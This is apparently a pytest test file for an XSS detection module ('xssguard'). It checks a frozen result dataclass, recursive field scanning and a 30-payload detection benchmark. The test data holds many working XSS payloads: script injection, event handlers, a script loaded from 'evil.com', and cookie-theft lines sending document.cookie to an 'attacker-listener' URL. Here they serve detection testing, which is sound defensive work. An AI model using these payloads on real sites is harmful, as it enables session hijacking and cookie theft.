"""Unit tests for xssguard.detector module.

Validates:
- DetectionResult frozen dataclass
- scan() with various attack vectors and safe inputs
- scan() None-safe and empty input handling
- scan() first match wins logic
- scan_mapping() recursive traversal (dict, list, tuple) and dotted field paths
- scan_mapping() invariant: only DETECTED results, zero SAFE results returned
- PRD FR-1: 30-payload benchmark with detection rate >= 80%
- Public API surface and architectural isolation
"""

import dataclasses
from typing import Any

import pytest

from xssguard.detector import DetectionResult, scan, scan_mapping
from xssguard.patterns import DEFAULT_XSS_PATTERNS


class TestDetectionResultDataclass:
    """Test DetectionResult schema, defaults, and immutability."""

    def test_instantiation_safe(self) -> None:
        res = DetectionResult(
            status="SAFE",
            matched_rule=None,
            payload="normal user input",
        )
        assert res.status == "SAFE"
        assert res.matched_rule is None
        assert res.payload == "normal user input"
        assert res.field is None

    def test_instantiation_detected(self) -> None:
        res = DetectionResult(
            status="DETECTED",
            matched_rule=r"(?i)<\s*/?\s*script\b",
            payload="<script>alert(1)</script>",
            field="comment.0.text",
        )
        assert res.status == "DETECTED"
        assert res.matched_rule == r"(?i)<\s*/?\s*script\b"
        assert res.payload == "<script>alert(1)</script>"
        assert res.field == "comment.0.text"

    def test_is_frozen_dataclass(self) -> None:
        assert dataclasses.is_dataclass(DetectionResult)
        res = DetectionResult(
            status="SAFE",
            matched_rule=None,
            payload="hello",
        )
        with pytest.raises(dataclasses.FrozenInstanceError):
            res.status = "DETECTED"  # type: ignore[misc]

        with pytest.raises(dataclasses.FrozenInstanceError):
            res.payload = "modified"  # type: ignore[misc]


class TestScanSinglePayload:
    """Test detector.scan() across known safe inputs and XSS attack patterns."""

    def test_safe_plain_text(self) -> None:
        text = "Hello world! This is a completely legitimate user comment."
        res = scan(text)
        assert res.status == "SAFE"
        assert res.matched_rule is None
        assert res.payload == text
        assert res.field is None

    def test_safe_text_with_punctuation_and_numbers(self) -> None:
        text = "Price: $19.99, Quantity: 5, Total = $99.95. Call (555) 123-4567."
        res = scan(text)
        assert res.status == "SAFE"
        assert res.matched_rule is None
        assert res.payload == text

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script src='http://evil.com/xss.js'></script>",
            "<  script >alert(document.cookie)</script>",
            "</script><script>alert(1)",
        ],
    )
    def test_inline_script_injection(self, payload: str) -> None:
        res = scan(payload)
        assert res.status == "DETECTED"
        assert res.matched_rule is not None
        assert res.payload == payload
        assert res.field is None

    @pytest.mark.parametrize(
        "payload",
        [
            "javascript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "javascript :alert(1)",
            "vbscript:msgbox(1)",
        ],
    )
    def test_javascript_protocol_injection(self, payload: str) -> None:
        res = scan(payload)
        assert res.status == "DETECTED"
        assert res.matched_rule is not None
        assert res.payload == payload

    @pytest.mark.parametrize(
        "payload",
        [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload = alert(1)>",
            "<input type=text onfocus=alert(1)>",
            "<a href='#' onclick=doEvil()>click me</a>",
            "<details ontoggle=alert(1)>",
        ],
    )
    def test_event_handler_injection(self, payload: str) -> None:
        res = scan(payload)
        assert res.status == "DETECTED"
        assert res.matched_rule is not None
        assert res.payload == payload

    @pytest.mark.parametrize(
        "payload",
        [
            "document.cookie",
            "DOCUMENT.COOKIE",
            "document . cookie",
            "fetch('/steal?c=' + document.cookie)",
        ],
    )
    def test_cookie_theft_document_cookie(self, payload: str) -> None:
        res = scan(payload)
        assert res.status == "DETECTED"
        assert res.matched_rule is not None
        assert res.payload == payload

    @pytest.mark.parametrize(
        "payload",
        [
            "var x = cookie.split(';')",
            "var c = cookie['session']",
            "cookie.length",
            "cookie;alert(1)",
        ],
    )
    def test_cookie_access_pattern(self, payload: str) -> None:
        res = scan(payload)
        assert res.status == "DETECTED"
        assert res.matched_rule is not None
        assert res.payload == payload

    @pytest.mark.parametrize(
        "payload",
        [
            "document.write('<h1>hacked</h1>')",
            "document.writeln('evil')",
            "window.location = 'https://attacker.com'",
            "document.location = 'https://attacker.com'",
            "document.innerHTML = '<p>replaced</p>'",
            "document.outerHTML = '<p>replaced</p>'",
        ],
    )
    def test_dangerous_dom_apis(self, payload: str) -> None:
        res = scan(payload)
        assert res.status == "DETECTED"
        assert res.matched_rule is not None
        assert res.payload == payload

    @pytest.mark.parametrize(
        "payload",
        [
            "eval('alert(1)')",
            "setTimeout('evil()', 100)",
            "setInterval('leak()', 500)",
        ],
    )
    def test_eval_timer_execution(self, payload: str) -> None:
        res = scan(payload)
        assert res.status == "DETECTED"
        assert res.matched_rule is not None
        assert res.payload == payload


class TestScanSafetyAndRobustness:
    """Test scan() robustness against empty, falsy, and non-string inputs."""

    def test_empty_string(self) -> None:
        res = scan("")
        assert res.status == "SAFE"
        assert res.matched_rule is None
        assert res.payload == ""
        assert res.field is None

    @pytest.mark.parametrize(
        "non_str_val",
        [None, 0, 123, 45.67, True, False, b"<script>alert(1)</script>", [], {}],
    )
    def test_none_and_non_string_values_safe(self, non_str_val: Any) -> None:
        # Per contract invariant: scan() does not raise for None/empty/non-string
        res = scan(non_str_val)  # type: ignore[arg-type]
        assert res.status == "SAFE"
        assert res.matched_rule is None
        assert res.payload == ""


class TestScanFirstMatchWins:
    """Test that scan() evaluates patterns in order and returns the first match."""

    def test_first_matching_pattern_in_default_patterns(self) -> None:
        # This payload matches both pattern 0 (<script) and pattern 3 (document.cookie)
        payload = "<script>alert(document.cookie)</script>"
        res = scan(payload)
        assert res.status == "DETECTED"
        assert res.matched_rule == DEFAULT_XSS_PATTERNS[0]

    def test_custom_pattern_ordering(self) -> None:
        p1 = r"(?i)foo"
        p2 = r"(?i)bar"
        custom_patterns = [p1, p2]

        res = scan("foobar", patterns=custom_patterns)
        assert res.status == "DETECTED"
        assert res.matched_rule == p1

        # Reverse ordering: p2 will win
        res_rev = scan("foobar", patterns=[p2, p1])
        assert res_rev.status == "DETECTED"
        assert res_rev.matched_rule == p2


class TestScanMapping:
    """Test scan_mapping() recursive traversal and invariant adherence."""

    def test_empty_mapping(self) -> None:
        results = scan_mapping({})
        assert results == []

    def test_clean_mapping_returns_empty_list(self) -> None:
        data = {
            "username": "alice",
            "age": 30,
            "bio": "Software developer based in Jakarta",
            "is_active": True,
            "tags": ["python", "security", "web"],
        }
        results = scan_mapping(data)
        # Invariant: scan_mapping NEVER returns SAFE results
        assert results == []

    def test_flat_mapping_single_detected(self) -> None:
        data = {
            "username": "attacker",
            "comment": "<script>alert(1)</script>",
        }
        results = scan_mapping(data)
        assert len(results) == 1
        res = results[0]
        assert res.status == "DETECTED"
        assert res.field == "comment"
        assert res.payload == "<script>alert(1)</script>"
        assert res.matched_rule is not None

    def test_flat_mapping_multiple_detected(self) -> None:
        data = {
            "first_name": "<img src=x onerror=alert(1)>",
            "last_name": "SafeLastName",
            "website": "javascript:steal()",
        }
        results = scan_mapping(data)
        assert len(results) == 2
        fields = {r.field for r in results}
        assert fields == {"first_name", "website"}
        for r in results:
            assert r.status == "DETECTED"

    def test_nested_dict_dotted_path(self) -> None:
        data = {
            "user": {
                "profile": {
                    "contact": {
                        "website": "javascript:alert(1)",
                    },
                    "headline": "Safe Headline",
                },
            },
        }
        results = scan_mapping(data)
        assert len(results) == 1
        assert results[0].field == "user.profile.contact.website"
        assert results[0].status == "DETECTED"
        assert results[0].payload == "javascript:alert(1)"

    def test_sequence_in_mapping_dotted_path_with_indices(self) -> None:
        data = {
            "comments": [
                "Great post!",
                "<script>document.cookie</script>",
                "Thanks for sharing",
            ],
            "metadata": ("v1.0", "<svg onload=alert(1)>"),
        }
        results = scan_mapping(data)
        assert len(results) == 2
        field_map = {r.field: r.payload for r in results}
        assert "comments.1" in field_map
        assert field_map["comments.1"] == "<script>document.cookie</script>"
        assert "metadata.1" in field_map
        assert field_map["metadata.1"] == "<svg onload=alert(1)>"

    def test_deeply_nested_complex_structure(self) -> None:
        data = {
            "articles": [
                {
                    "title": "Clean Title",
                    "sections": [
                        {"content": "Normal text"},
                        {"content": "<img src=x onerror=evil()>"},
                    ],
                }
            ]
        }
        results = scan_mapping(data)
        assert len(results) == 1
        assert results[0].field == "articles.0.sections.1.content"
        assert results[0].status == "DETECTED"

    def test_non_string_scalars_are_ignored(self) -> None:
        data = {
            "int_val": 42,
            "float_val": 3.14159,
            "bool_true": True,
            "bool_false": False,
            "none_val": None,
            "bytes_val": b"<script>alert(1)</script>",
        }
        results = scan_mapping(data)
        assert results == []


class TestBenchmarkDetectionRate:
    """PRD FR-1 Benchmark: 30-payload dataset across 4 attack categories.

    Acceptance Criteria: Detection Rate (DR) >= 80%.
    Official Dataset: 10 SI, 10 EH, 5 CT, 5 DM = 30 total.
    """

    PAYLOADS: list[tuple[str, str, str]] = [
        # Inline Script Injection: SI-01..SI-10 (10)
        ("SI-01", "Inline Script Injection", "<script>alert('XSS')</script>"),
        ("SI-02", "Inline Script Injection", "<script>alert(document.cookie)</script>"),
        ("SI-03", "Inline Script Injection", "<script>eval('alert(1)')</script>"),
        ("SI-04", "Inline Script Injection", "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"),
        ("SI-05", "Inline Script Injection", "<SCRIPT>alert('XSS')</SCRIPT>"),
        ("SI-06", "Inline Script Injection", "<script>setTimeout(function(){alert('XSS')},100)</script>"),
        ("SI-07", "Inline Script Injection", "<script>document.title='XSS'</script>"),
        ("SI-08", "Inline Script Injection", '<script src="/static/js/test.js"></script>'),
        ("SI-09", "Inline Script Injection", "<script>document.write('<img src=x onerror=alert(1)>')</script>"),
        ("SI-10", "Inline Script Injection", "<script>document.body.style.background='yellow'</script>"),

        # Event Handler Injection: EH-01..EH-10 (10)
        ("EH-01", "Event Handler Injection", "<img src=x onerror=alert('XSS')>"),
        ("EH-02", "Event Handler Injection", '<svg onload="alert(\'XSS\')"></svg>'),
        ("EH-03", "Event Handler Injection", '<button onclick="alert(\'XSS\')">Klik</button>'),
        ("EH-04", "Event Handler Injection", "<div onclick=alert('XSS')>Klik saya</div>"),
        ("EH-05", "Event Handler Injection", "<a onmouseover=alert('XSS')>Hover di sini</a>"),
        ("EH-06", "Event Handler Injection", '<input type="text" onfocus="alert(\'XSS\')">'),
        ("EH-07", "Event Handler Injection", "<select onchange=alert('XSS')><option>Pilih</option></select>"),
        ("EH-08", "Event Handler Injection", "<details open ontoggle=alert('XSS')>Detail</details>"),
        ("EH-09", "Event Handler Injection", "<video src=x onerror=alert('XSS')></video>"),
        ("EH-10", "Event Handler Injection", '<textarea onfocus="alert(\'XSS\')"></textarea>'),

        # Cookie Theft: CT-01..CT-05 (5)
        ("CT-01", "Cookie Theft", '<script>console.log("Cookie =", document.cookie || "[EMPTY]");</script>'),
        ("CT-02", "Cookie Theft", "<script>new Image().src='http://localhost:5000/auth/attacker-listener?c='+document.cookie</script>"),
        ("CT-03", "Cookie Theft", '<img src=x onerror="this.src=\'http://localhost:5000/auth/attacker-listener?c=\'+document.cookie">'),
        ("CT-04", "Cookie Theft", "<script>var x=new XMLHttpRequest();x.open('GET','/auth/attacker-listener?c='+document.cookie);x.send()</script>"),
        ("CT-05", "Cookie Theft", "<script>fetch('/auth/attacker-listener?c=' + encodeURIComponent(document.cookie));</script>"),

        # DOM Manipulation: DM-01..DM-05 (5)
        ("DM-01", "DOM Manipulation", "<script>document.body.style.border='5px solid red'</script>"),
        ("DM-02", "DOM Manipulation", "<script>document.title='Hacked by XSS'</script>"),
        ("DM-03", "DOM Manipulation", "<script>document.body.style.background='gray'</script>"),
        ("DM-04", "DOM Manipulation", "<script>document.body.style.fontSize='22px'</script>"),
        ("DM-05", "DOM Manipulation", "<script>document.body.style.filter='grayscale(100%)';</script>"),
    ]

    def test_benchmark_dr_greater_than_or_equal_to_80_percent(self) -> None:
        assert len(self.PAYLOADS) == 30, f"Benchmark requires exactly 30 payloads, got {len(self.PAYLOADS)}"

        # Validate category distribution
        categories = [cat for _, cat, _ in self.PAYLOADS]
        assert categories.count("Inline Script Injection") == 10
        assert categories.count("Event Handler Injection") == 10
        assert categories.count("Cookie Theft") == 5
        assert categories.count("DOM Manipulation") == 5

        # Validate unique IDs
        ids = [pid for pid, _, _ in self.PAYLOADS]
        assert len(ids) == len(set(ids)), "Duplicate payload IDs found"

        detected_count = 0
        for _pid, _cat, payload in self.PAYLOADS:
            res = scan(payload)
            if res.status == "DETECTED":
                detected_count += 1

        dr = (detected_count / len(self.PAYLOADS)) * 100.0
        assert dr >= 80.0, f"Detection rate {dr:.2f}% is below PRD requirement of 80% ({detected_count}/{len(self.PAYLOADS)})"
        assert detected_count == 30


class TestDetectorArchitecturalIsolation:
    """Ensure detector module does not import Flask, storage, or external dependencies."""

    def test_public_api_surface(self) -> None:
        import ast
        import inspect
        import xssguard.detector as det

        tree = ast.parse(inspect.getsource(det))
        defined_classes = {
            n.name
            for n in tree.body
            if isinstance(n, ast.ClassDef) and not n.name.startswith("_")
        }
        defined_funcs = {
            n.name
            for n in tree.body
            if isinstance(n, ast.FunctionDef) and not n.name.startswith("_")
        }
        assert (defined_classes | defined_funcs) == {"DetectionResult", "scan", "scan_mapping"}
